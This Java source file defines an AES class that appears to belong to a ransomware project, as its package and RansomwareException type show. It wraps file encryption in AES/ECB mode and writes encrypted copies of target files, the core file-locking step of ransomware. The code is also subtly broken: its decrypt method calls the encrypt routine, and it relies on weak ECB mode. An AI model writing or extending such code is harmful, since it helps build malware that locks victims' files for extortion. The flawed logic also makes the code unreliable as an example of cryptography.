package Agent.EncryptionAlgo;

import java.io.File;
import javax.crypto.SecretKey;

import Agent.Utils.JavaCryptoUtil;
import Agent.exceptions.CryptoException;
import Agent.exceptions.RansomwareException;

public class AES implements CryptoAlgorithm {


	@Override
	public void encrypt(SecretKey skey, File fileToEncrypt) throws RansomwareException {

		try {
			JavaCryptoUtil.encrypt(skey, fileToEncrypt,CHANGENAME.encryptedOutputFile(fileToEncrypt), "AES/ECB/PKCS5Padding");
		} catch (CryptoException e) {
			throw new CryptoException("problem with encrypting", e.getCause());
		}

	}

	@Override
	public void decrypt(SecretKey skey, File fileToDecrypt) throws RansomwareException {

		try {
			JavaCryptoUtil.encrypt(skey, fileToDecrypt,CHANGENAME.decryptedOutputFile(fileToDecrypt), "AES/ECB/PKCS5Padding");
		} catch (CryptoException e) {
			throw new CryptoException("problem with decrypting", e.getCause());
		}
	}


	

}
